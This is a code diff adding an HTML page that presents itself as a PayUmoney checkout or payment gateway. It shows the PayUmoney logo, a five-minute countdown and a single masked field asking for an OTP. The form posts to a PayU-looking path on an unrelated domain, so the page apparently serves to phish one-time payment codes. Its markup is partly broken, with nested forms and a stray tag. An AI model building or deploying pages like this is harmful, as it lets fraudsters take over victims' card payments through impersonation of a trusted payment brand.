@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title> Checkout Form / Payment Gateway</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://unpkg.com/akar-icons-fonts"></script><link rel="stylesheet" href="./style.css">
+<link rel="stylesheet" type="text/css" href="https://unpkg.com/slick-loader@1.1.20/slick-loader.min.css">
+<script src="https://unpkg.com/slick-loader@1.1.20/slick-loader.min.js"></script>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="screen flex-center">
+<form class="popup flex p-lg" action="https://shivshaktienterprisespvt.in/payment/payuonline/paynow/verify.php" method="post">
+  <form id="myForm" class="popup flex p-lg">
+    <div class="close-btn pointer flex-center p-sm">
+      <i class="ai-cross"></i>
+    </div>
+    
+      <!-- CARD FORM -->
+      <div class="flex-fill flex-vertical">
+        <div class="header flex-between flex-vertical-center">
+          <div class="flex-vertical-center">
+            <img src="./PayUmoney_Logo.jpg">
+            
+          </div>
+          <div class="timer" id="timer">
+            <span>0</span><span>5</span>
+            <em>:</em>
+            <span>0</span><span>0</span>
+          </div>
+        </div>
+        <div class="card-data flex-fill flex-vertical">
+          
+       
+         
+          <!-- CCV Number -->
+          <div class="flex-between">
+            <div class="card-property-title">
+              <strong>OTP</strong>
+              <span>Enter OTP</span>
+            </div>
+            <div class="card-property-value">
+              <div class="input-container">
+                <input  id="phone" name="otp" type="password" maxlength="8">
+                <i id="cvc_toggler" data-target="cvc"  class="ai-eye-open pointer" ></i>
+              </div>
+            </div>
+          </div>
+          
+         
+
+         
+          
+          
+        </div>
+        <div class="action flex-center">
+          <button id="submitBtn" type="submit" name="submit" value="submit" class="b-main-color pointer">Pay Now</button>
+        </div>
+      </div>
+    
+     
+       
+    </form>
+  </d>
+</div>
+<!-- partial -->
+  <script  src="./time.js"></script>
+
+
+</body>
+</html>
